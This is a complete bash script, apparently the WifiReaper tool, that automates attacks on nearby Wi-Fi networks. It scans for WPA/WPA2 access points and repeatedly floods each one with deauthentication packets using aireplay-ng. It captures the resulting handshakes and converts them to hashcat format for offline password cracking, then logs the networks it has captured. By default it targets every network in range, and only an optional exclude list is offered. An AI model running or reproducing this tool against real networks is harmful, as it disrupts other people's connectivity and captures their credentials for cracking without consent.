#!/bin/bash

# Default values
SCAN_TIMEOUT=60
DEAUTH_TIMEOUT=10
DEAUTH_ATTEMPTS=3
LOOP=false
SCAN_ONLY=false
WAIT_MINUTES=0
EXCLUDE_NETWORKS=()
IGNORE_DATABASE=false

# Working directory variables
SUBFOLDER=""
FOLDER_CREATED=false
DATA_DIR="Data"
REAPED_DIR="Reaped"

# Database file
DATABASE_FILE="$DATA_DIR/wifireaper_cracked.db"

# Initialize stats tracking
TOTAL_NETWORKS=0
TOTAL_DEAUTH_ATTEMPTS=0
SUCCESSFUL_CAPTURES=0
FAILED_ATTEMPTS=0
START_TIME=$(date)
CAPTURED_FILES=()
CRACKED_BSSIDS=()

# Global flag for graceful shutdown
SHUTDOWN_REQUESTED=false

# Interface variables
ORIGINAL_INTERFACE=""
MONITOR_INTERFACE=""

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Function to install a package
install_package() {
    local pkg=$1
    if ! command_exists "$pkg"; then
        echo "$pkg not found. Install it? (y/n)"
        read -r answer
        if [[ "$answer" =~ ^[Yy] ]]; then
            echo "Installing $pkg..."
            if ! apt-get install "$pkg" -y; then
                echo "Error: Failed to install $pkg"
                exit 1
            fi
        else
            echo "Error: $pkg is required"
            exit 1
        fi
    fi
}

# Function to check and install required dependencies
check_dependencies() {
    local required_packages=()
    
    # Check aircrack-ng suite (includes airmon-ng, airodump-ng, aireplay-ng)
    if ! command_exists "airmon-ng" || ! command_exists "airodump-ng"; then
        required_packages+=("aircrack-ng")
    fi
    
    # Only check aireplay-ng if not in scan-only mode
    if [[ $SCAN_ONLY == false ]] && ! command_exists "aireplay-ng"; then
        required_packages+=("aircrack-ng")
    fi
    
    # Check tshark/wireshark for basic validation
    if ! command_exists "tshark"; then
        required_packages+=("tshark")
    fi
    
    # Check hcxpcapngtool for handshake validation and conversion
    if [[ $SCAN_ONLY == false ]] && ! command_exists "hcxpcapngtool"; then
        required_packages+=("hcxtools")
    fi
    
    # Install missing packages
    for pkg in "${required_packages[@]}"; do
        install_package "$pkg"
    done
}

# Function to validate and convert handshake using hcxpcapngtool
validate_and_convert_handshake() {
    local cap_file="$1"
    local base_name="$2"
    
    [[ ! -f "$cap_file" ]] && return 1
    
    if ! command_exists "hcxpcapngtool"; then
        return 1
    fi
    
    # Create final filename for the converted hash
    local final_hash="${REAPED_DIR}/${base_name}.hc22000"
    
    # Run hcxpcapngtool to convert and validate
    local output
    output=$(sudo hcxpcapngtool -o "$final_hash" "$cap_file" 2>&1)
    local exit_code=$?
    
    # Check if conversion was successful
    if [[ $exit_code -eq 0 && -f "$final_hash" && -s "$final_hash" ]]; then
        # Verify that actual EAPOL pairs were written
        if echo "$output" | grep -q "EAPOL pairs written to 22000 hash file"; then
            return 0
        else
            # Clean up if no valid pairs found
            rm -f "$final_hash"
            return 1
        fi
    else
        # Clean up any partial files
        rm -f "$final_hash"
        return 1
    fi
}

# Function to create required directories
create_directories() {
    # Create Data directory for captures and database
    if [[ ! -d "$DATA_DIR" ]]; then
        mkdir -p "$DATA_DIR"
        echo "Created directory: $DATA_DIR"
    fi
    
    # Create Reaped directory for final .hc22000 files (only if not scan-only mode)
    if [[ $SCAN_ONLY == false && ! -d "$REAPED_DIR" ]]; then
        mkdir -p "$REAPED_DIR"
        echo "Created directory: $REAPED_DIR"
    fi
}

init_database() {
    if [[ $SCAN_ONLY == false && ! -f "$DATABASE_FILE" ]]; then
        echo "# WifiReaper Database" > "$DATABASE_FILE"
        echo "# Format: DATETIME|FILEPATH|BSSID|ESSID" >> "$DATABASE_FILE"
        echo "Database created: $DATABASE_FILE"
    fi
}

# Function to add entry to database
add_to_database() {
    local filepath="$1"
    local bssid="$2" 
    local essid="$3"
    local datetime=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo "$datetime|$filepath|$bssid|$essid" >> "$DATABASE_FILE"
}

# Function to load cracked BSSIDs from database
load_cracked_bssids() {
    CRACKED_BSSIDS=()
    [[ ! -f "$DATABASE_FILE" ]] && return
    
    while IFS='|' read -r datetime filepath bssid essid; do
        # Skip comments and empty lines
        [[ "$datetime" =~ ^# ]] || [[ -z "$datetime" ]] && continue
        CRACKED_BSSIDS+=("$bssid")
    done < "$DATABASE_FILE"
}

# Function to display cracked database
display_cracked_database() {
    [[ $SCAN_ONLY == true || ! -f "$DATABASE_FILE" ]] && return
    
    local count=0
    echo ""
    echo "Known Cracked Networks:"
    while IFS='|' read -r datetime filepath bssid essid; do
        # Skip comments and empty lines
        [[ "$datetime" =~ ^# ]] || [[ -z "$datetime" ]] && continue
        echo "  $bssid ($essid) - $datetime"
        count=$((count + 1))
    done < "$DATABASE_FILE"
    
    if [[ $count -eq 0 ]]; then
        echo "  No cracked networks found"
    fi
    echo ""
}

# Function to check if BSSID is in exclude list
is_excluded() {
    local bssid="$1"
    local essid="$2"
    
    for exclude in "${EXCLUDE_NETWORKS[@]}"; do
        [[ "$bssid" == "$exclude" ]] || [[ "$essid" == "$exclude" ]] && return 0
    done
    return 1
}

# Function to check if BSSID is already cracked
is_already_cracked() {
    local bssid="$1"
    [[ $IGNORE_DATABASE == true || $SCAN_ONLY == true ]] && return 1
    
    for cracked_bssid in "${CRACKED_BSSIDS[@]}"; do
        [[ "$bssid" == "$cracked_bssid" ]] && return 0
    done
    return 1
}

# Function to generate unique directory name
generate_unique_dir() {
    local base_name="WifiReaper_$(date +%Y-%m-%d_%H-%M-%S)"
    local counter=1
    local dir_name="$DATA_DIR/$base_name"
    
    while [[ -d "$dir_name" ]]; do
        dir_name="$DATA_DIR/${base_name}_${counter}"
        counter=$((counter + 1))
    done
    
    echo "$dir_name"
}

# Function to generate unique filename
generate_unique_filename() {
    local base_path="$1"
    local counter=1
    local file_path="$base_path"
    
    while [[ -f "${file_path}-01.cap" ]]; do
        file_path="${base_path}_${counter}"
        counter=$((counter + 1))
    done
    
    echo "$file_path"
}

# Function to create working directory only when needed
create_working_dir() {
    if [[ "$FOLDER_CREATED" == false && $SCAN_ONLY == false ]]; then
        SUBFOLDER=$(generate_unique_dir)
        mkdir -p "$SUBFOLDER"
        echo "Created directory: $SUBFOLDER"
        FOLDER_CREATED=true
    fi
}

# Function to print report
print_report() {
    echo ""
    echo "WifiReaper Report"
    echo "Mode: $([ $SCAN_ONLY == true ] && echo "SCAN ONLY" || echo "ATTACK")"
    echo "Duration: $START_TIME to $(date)"
    [[ "$FOLDER_CREATED" == true ]] && echo "Files saved to: $SUBFOLDER"
    if [[ $SCAN_ONLY == true ]]; then
        echo "Networks discovered: $TOTAL_NETWORKS"
    else
        echo "Networks: $TOTAL_NETWORKS | Attempts: $TOTAL_DEAUTH_ATTEMPTS | Success: $SUCCESSFUL_CAPTURES | Failed: $FAILED_ATTEMPTS"
        [[ ${#CAPTURED_FILES[@]} -gt 0 ]] && echo "Captured files: ${#CAPTURED_FILES[@]}"
    fi
    echo ""
}

# Function to kill all background processes
kill_background_processes() {
    sudo pkill -f airodump-ng >/dev/null 2>&1
    [[ $SCAN_ONLY == false ]] && sudo pkill -f aireplay-ng >/dev/null 2>&1
    local pids=$(jobs -p 2>/dev/null)
    [[ -n "$pids" ]] && echo "$pids" | xargs -r kill -9 >/dev/null 2>&1
    sleep 1
}

# Function to cleanup on exit
cleanup() {
    SHUTDOWN_REQUESTED=true
    echo ""
    echo "Cleaning up..."
    
    kill_background_processes
    
    if [[ -n "$MONITOR_INTERFACE" ]]; then
        sudo airmon-ng stop "${MONITOR_INTERFACE}" >/dev/null 2>&1
    elif [[ -n "$ORIGINAL_INTERFACE" ]]; then
        sudo airmon-ng stop "${ORIGINAL_INTERFACE}mon" >/dev/null 2>&1
        sudo airmon-ng stop "${ORIGINAL_INTERFACE}" >/dev/null 2>&1
    fi
    
    rm -f networks-*.csv networks-*.kismet.csv networks-*.kismet.netxml
    print_report
    exit 0
}

# Enhanced signal handling
handle_sigint() {
    echo ""
    echo "Caught Ctrl+C - shutting down..."
    cleanup
}

# Set up signal traps
trap 'handle_sigint' INT
trap 'cleanup' EXIT TERM

# Show usage
show_usage() {
    echo "WifiReaper"
	echo "----------"
	echo ""
    echo "Usage: sudo $0 <interface> [options]"
    echo ""
    echo "Options:"
    echo "  -s, --scan        Scan only mode (no attacks)"
    echo "  -l, --loop        Run continuously"
    echo "  -w, --wait <min>  Wait time between loop cycles in minutes (default: 0)"
    echo "  -ST <seconds>     Scan timeout (default: 60)"
    echo "  -DT <seconds>     Deauth timeout (default: 10)" 
    echo "  -DA <attempts>    Deauth attempts per network (default: 3)"
    echo "  -e, --exclude <network>  Exclude network by ESSID or BSSID (can use multiple times)"
    echo "  -i, --ignore      Ignore cracked database and attack all networks"
    echo "  -h, --help        Show this help"
    echo ""
    echo "Examples:"
    echo "  sudo $0 wlan0 --scan"
    echo "  sudo $0 wlan0 --scan --loop --wait 5"
    echo "  sudo $0 wlan0 --loop -w 10 -DA 2"
    echo "  sudo $0 wlan0 -e \"MyNetwork\" -e \"AA:BB:CC:DD:EE:FF\""
    echo "  sudo $0 wlan0 --ignore"
}

# Function to find monitor interface
find_monitor_interface() {
    if [[ "$ORIGINAL_INTERFACE" == *"mon" ]]; then
        MONITOR_INTERFACE="$ORIGINAL_INTERFACE"
        return 0
    fi
    
    local possible_names=("${ORIGINAL_INTERFACE}mon" "${ORIGINAL_INTERFACE}")
    
    for name in "${possible_names[@]}"; do
        if iwconfig "$name" 2>/dev/null | grep -q "Mode:Monitor"; then
            MONITOR_INTERFACE="$name"
            return 0
        fi
    done
    
    return 1
}

# Function to find the latest CSV file
find_latest_csv() {
    local latest_file=""
    local latest_time=0
    
    for file in networks-*.csv; do
        if [[ -f "$file" ]]; then
            local file_time=$(stat -c %Y "$file" 2>/dev/null || stat -f %m "$file" 2>/dev/null)
            if [[ $file_time -gt $latest_time ]]; then
                latest_time=$file_time
                latest_file="$file"
            fi
        fi
    done
    
    echo "$latest_file"
}

# Function to scan networks
scan_networks() {
    local timeout_duration=$1
    echo "Scanning networks (${timeout_duration}s)..."
    
    rm -f networks-*.csv networks-*.kismet.csv networks-*.kismet.netxml
    
    sudo airodump-ng -b abg "${MONITOR_INTERFACE}" --write networks --output-format csv >/dev/null 2>&1 &
    local scan_pid=$!
    
    local count=0
    while ((count < timeout_duration)) && kill -0 $scan_pid 2>/dev/null; do
        [[ $SHUTDOWN_REQUESTED == true ]] && { kill $scan_pid 2>/dev/null; return 1; }
        sleep 1
        count=$((count + 1))
        if ((count % 15 == 0)); then
            echo "   Progress: ${count}/${timeout_duration}s"
        fi
    done
    
    kill $scan_pid 2>/dev/null
    wait $scan_pid 2>/dev/null
    sleep 2
    return 0
}

# Check for help flag first
for arg in "$@"; do
    [[ "$arg" == "-h" || "$arg" == "--help" ]] && { show_usage; trap - EXIT TERM INT; exit 0; }
done

# Check if script is run as root
[[ $EUID -ne 0 ]] && { echo "Error: Run as root (use sudo)"; trap - EXIT TERM INT; exit 1; }

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -s|--scan) SCAN_ONLY=true; shift ;;
        -l|--loop) LOOP=true; shift ;;
        -i|--ignore) IGNORE_DATABASE=true; shift ;;
        -w|--wait)
            [[ -n "$2" && "$2" =~ ^[0-9]+$ ]] && { WAIT_MINUTES="$2"; shift 2; } || { echo "Error: -w requires numeric value"; trap - EXIT TERM INT; exit 1; }
            ;;
        -e|--exclude)
            [[ -n "$2" ]] && { EXCLUDE_NETWORKS+=("$2"); shift 2; } || { echo "Error: -e requires a value"; trap - EXIT TERM INT; exit 1; }
            ;;
        -ST) 
            [[ -n "$2" && "$2" =~ ^[0-9]+$ ]] && { SCAN_TIMEOUT="$2"; shift 2; } || { echo "Error: -ST requires numeric value"; trap - EXIT TERM INT; exit 1; }
            ;;
        -DT)
            [[ -n "$2" && "$2" =~ ^[0-9]+$ ]] && { DEAUTH_TIMEOUT="$2"; shift 2; } || { echo "Error: -DT requires numeric value"; trap - EXIT TERM INT; exit 1; }
            ;;
        -DA)
            [[ -n "$2" && "$2" =~ ^[0-9]+$ ]] && { DEAUTH_ATTEMPTS="$2"; shift 2; } || { echo "Error: -DA requires numeric value"; trap - EXIT TERM INT; exit 1; }
            ;;
        -*)
            echo "Unknown option: $1"; show_usage; trap - EXIT TERM INT; exit 1 ;;
        *)
            [[ -z "$ORIGINAL_INTERFACE" ]] && { ORIGINAL_INTERFACE="$1"; shift; } || { echo "Error: Multiple interfaces specified"; trap - EXIT TERM INT; exit 1; }
            ;;
    esac
done

# Check if interface was provided
[[ -z "$ORIGINAL_INTERFACE" ]] && { echo "Error: Specify wireless interface"; show_usage; trap - EXIT TERM INT; exit 1; }

# Check dependencies and create directories
check_dependencies
create_directories

# Initialize database and load cracked networks (only if not scan-only mode)
if [[ $SCAN_ONLY == false ]]; then
    init_database
    load_cracked_bssids
fi

echo ""
echo "WifiReaper"
echo "----------"
echo "[github.com/blwhit/WifiReaper]"
echo ""
echo "Mode: $([ $SCAN_ONLY == true ] && echo "SCAN ONLY" || echo "ATTACK")"
echo "Interface: $ORIGINAL_INTERFACE | Scan: ${SCAN_TIMEOUT}s"
[[ $SCAN_ONLY == false ]] && echo "Deauth: ${DEAUTH_TIMEOUT}s | Attempts: $DEAUTH_ATTEMPTS"
echo "Loop: $LOOP"
[[ $LOOP == true && $WAIT_MINUTES -gt 0 ]] && echo "Wait between loops: ${WAIT_MINUTES} minutes"
[[ ${#EXCLUDE_NETWORKS[@]} -gt 0 ]] && echo "Excluded: ${EXCLUDE_NETWORKS[*]}"
[[ $IGNORE_DATABASE == true && $SCAN_ONLY == false ]] && echo "Ignoring cracked database"
echo "Press Ctrl+C to stop"

# Display known cracked networks (only in attack mode)
if [[ $SCAN_ONLY == false ]]; then
    display_cracked_database
fi

# Start monitor mode
if ! iwconfig "$ORIGINAL_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "Starting monitor mode..."
    sudo airmon-ng start "$ORIGINAL_INTERFACE" >/dev/null 2>&1 || { echo "Error: Failed to start monitor mode"; exit 1; }
    sleep 2
else
    echo "Interface already in monitor mode"
fi

# Find the monitor interface
find_monitor_interface || { echo "Error: Could not find monitor interface"; exit 1; }
echo "Using monitor interface: $MONITOR_INTERFACE"

# Main loop
scan_count=0
while true; do
    [[ $SHUTDOWN_REQUESTED == true ]] && break
    
    scan_count=$((scan_count + 1))
    echo ""
    echo "Scan #$scan_count"
    echo "----------"
    
    # Perform network scan
    if ! scan_networks "$SCAN_TIMEOUT"; then
        [[ $SHUTDOWN_REQUESTED == true ]] && break
        echo "Scan failed, retrying..."
        FAILED_ATTEMPTS=$((FAILED_ATTEMPTS + 1))
        sleep 3
        continue
    fi
    
    # Find and process CSV file
    csv_file=$(find_latest_csv)
    if [[ ! -f "$csv_file" ]]; then
        echo "No networks detected"
        FAILED_ATTEMPTS=$((FAILED_ATTEMPTS + 1))
        ! $LOOP && break
        sleep 3
        continue
    fi
    
    echo "Processing: $csv_file"
    
    # Parse networks from CSV
    mapfile -t networks_array < <(awk -F',' '
        BEGIN { OFS="," }
        /Station MAC/ {exit}
        NR>1 && NF>=14 && $1 ~ /^[[:space:]]*[0-9A-Fa-f:]{17}[[:space:]]*$/ {
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $1);
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $4);
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $6);
            gsub(/^[[:space:]]+|[[:space:]]+$/, "", $14);
            
            if($1 ~ /^[0-9A-Fa-f:]{17}$/ && $4 ~ /^[0-9]+$/ && $4 >= 1 && $4 <= 14) {
                privacy = $6;
                # Skip WPA3, OWE, OPN, and blank privacy fields
                if(privacy ~ /^(WPA3|OWE|OPN|)$/) next;
                
                essid = ($14 == "" ? "<hidden>" : $14);
                print $1 "," $4 "," essid;
            }
        }' "$csv_file" 2>/dev/null)
    
    if [[ ${#networks_array[@]} -eq 0 ]]; then
        echo "No valid networks found"
        rm -f networks-*.csv networks-*.kismet.csv networks-*.kismet.netxml
        FAILED_ATTEMPTS=$((FAILED_ATTEMPTS + 1))
        ! $LOOP && break
        sleep 3
        continue
    fi
    
    # Reload cracked BSSIDs from database for loop mode (only in attack mode)
    if [[ $LOOP == true && $SCAN_ONLY == false ]]; then
        load_cracked_bssids
    fi
    
    # Filter networks (exclude whitelist, already cracked if in attack mode)
    filtered_networks=()
    for network_data in "${networks_array[@]}"; do
        IFS=',' read -r bssid channel essid <<< "$network_data"
        
        if is_excluded "$bssid" "$essid"; then
            echo "SKIP: Excluded: $bssid ($essid)"
            continue
        fi
        
        if [[ $SCAN_ONLY == false ]] && is_already_cracked "$bssid"; then
            echo "SKIP: Already captured: $bssid ($essid)"
            continue
        fi
        
        filtered_networks+=("$network_data")
    done
    
    network_count=${#filtered_networks[@]}
    TOTAL_NETWORKS=$((TOTAL_NETWORKS + network_count))
    
    if [[ $network_count -eq 0 ]]; then
        echo "No networks found after filtering"
        rm -f networks-*.csv networks-*.kismet.csv networks-*.kismet.netxml
        ! $LOOP && break
        sleep 3
        continue
    fi
    
    if [[ $SCAN_ONLY == true ]]; then
        echo ""
        echo "Found $network_count networks:"
        echo ""
        for network_data in "${filtered_networks[@]}"; do
            IFS=',' read -r bssid channel essid <<< "$network_data"
            printf "   %-18s CH%-3s %s\n" "$bssid" "$channel" "$essid"
        done
    else
        echo ""
        echo "Found $network_count networks to attack:"
        echo ""
        
        # Display targets in a nice table format
        for network_data in "${filtered_networks[@]}"; do
            IFS=',' read -r bssid channel essid <<< "$network_data"
            printf "   %-18s CH%-3s %s\n" "$bssid" "$channel" "$essid"
        done
        echo ""
        
        # Attack each network
        for i in "${!filtered_networks[@]}"; do
            [[ $SHUTDOWN_REQUESTED == true ]] && break
            
            IFS=',' read -r bssid channel essid <<< "${filtered_networks[i]}"
            [[ -z "$bssid" || -z "$channel" ]] && continue
            
            network_num=$((i + 1))
            echo "[$network_num/$network_count] Attacking: $essid ($bssid)"
            
            # Set channel
            sudo iwconfig "${MONITOR_INTERFACE}" channel "$channel" 2>/dev/null
            sleep 1
            
            create_working_dir
            
            # Perform attacks
            local success=false
            for ((attempt=1; attempt<=DEAUTH_ATTEMPTS; attempt++)); do
                [[ $SHUTDOWN_REQUESTED == true ]] && break 2
                
                # Generate unique capture filename
                base_capture="${SUBFOLDER}/$(date +%Y-%m-%d_%H-%M-%S)_${essid// /_}_CH${channel}_${bssid//:/}"
                capture_file=$(generate_unique_filename "$base_capture")
                
                # Start packet capture
                sudo airodump-ng -b abg "${MONITOR_INTERFACE}" --bssid "$bssid" --channel "$channel" \
                    --write "$capture_file" --output-format pcap >/dev/null 2>&1 &
                capture_pid=$!
                sleep 2
                
                # Start deauth attack (continuous mode)
                timeout "$DEAUTH_TIMEOUT" sudo aireplay-ng --deauth 0 -a "$bssid" "${MONITOR_INTERFACE}" >/dev/null 2>&1
                
                # Stop capture
                kill $capture_pid 2>/dev/null
                wait $capture_pid 2>/dev/null
                
                TOTAL_DEAUTH_ATTEMPTS=$((TOTAL_DEAUTH_ATTEMPTS + 1))
                
                # Check results and validate handshake
                if [[ -f "${capture_file}-01.cap" ]]; then
                    filesize=$(stat -c%s "${capture_file}-01.cap" 2>/dev/null || echo 0)
                    if [[ $filesize -gt 1000 ]]; then
                        # Extract base filename for conversion (remove the -01 suffix)
                        base_filename=$(basename "${capture_file}")
                        
                        if validate_and_convert_handshake "${capture_file}-01.cap" "$base_filename"; then
                            CAPTURED_FILES+=("${capture_file}-01.cap")
                            SUCCESSFUL_CAPTURES=$((SUCCESSFUL_CAPTURES + 1))
                            
                            # Add to database
                            add_to_database "$(realpath "${capture_file}-01.cap")" "$bssid" "$essid"
                            echo "  SUCCESS"
                            
                            # Update cracked list for current session
                            CRACKED_BSSIDS+=("$bssid")
                            success=true
                            break  # Stop attacking this network
                        else
                            rm -f "${capture_file}-01.cap"
                            FAILED_ATTEMPTS=$((FAILED_ATTEMPTS + 1))
                        fi
                    else
                        rm -f "${capture_file}-01.cap"
                        FAILED_ATTEMPTS=$((FAILED_ATTEMPTS + 1))
                    fi
                else
                    FAILED_ATTEMPTS=$((FAILED_ATTEMPTS + 1))
                fi
                
                sleep 1
            done
            
            # Print result only once per network
            [[ $success == false ]] && echo "  FAILED"
        done
    fi
    
    # Cleanup
    rm -f networks-*.csv networks-*.kismet.csv networks-*.kismet.netxml
    
    if [[ $SCAN_ONLY == true ]]; then
        echo ""
        echo "Completed scan #$scan_count - discovered $network_count networks"
    else
        echo ""
        echo "Completed scan #$scan_count - attacked $network_count networks"
    fi
    
    # Exit if not in loop mode
    ! $LOOP && { echo ""; echo "Single scan complete"; break; }
    
    # Wait between loop cycles
    if [[ $WAIT_MINUTES -gt 0 ]]; then
        echo ""
        echo "Waiting ${WAIT_MINUTES} minutes before next scan..."
        sleep $((WAIT_MINUTES * 60))
    else
        echo ""
        sleep 2
    fi
done

[[ $SHUTDOWN_REQUESTED == false ]] && echo "Exiting WifiReaper..."